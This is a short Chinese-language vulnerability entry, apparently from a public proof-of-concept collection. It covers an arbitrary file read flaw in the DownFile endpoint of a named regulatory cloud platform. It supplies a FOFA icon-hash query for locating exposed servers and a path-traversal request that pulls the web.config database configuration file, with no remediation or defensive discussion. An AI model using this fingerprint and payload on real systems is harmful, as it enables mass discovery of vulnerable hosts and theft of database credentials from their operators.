## 中科智远科技-综合监管云平台DownFile存在任意文件读取漏洞

中科智远科技-综合监管云平台 /Download/DownFile 存在任意文件读取漏洞，读取数据库配置文件导致数据泄露。


## fofa

```
icon_hash="-227059202"
```

## poc

```
/Download/DownFile?fileName=../web.config
```

![image-20240707202558023](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407072025096.png)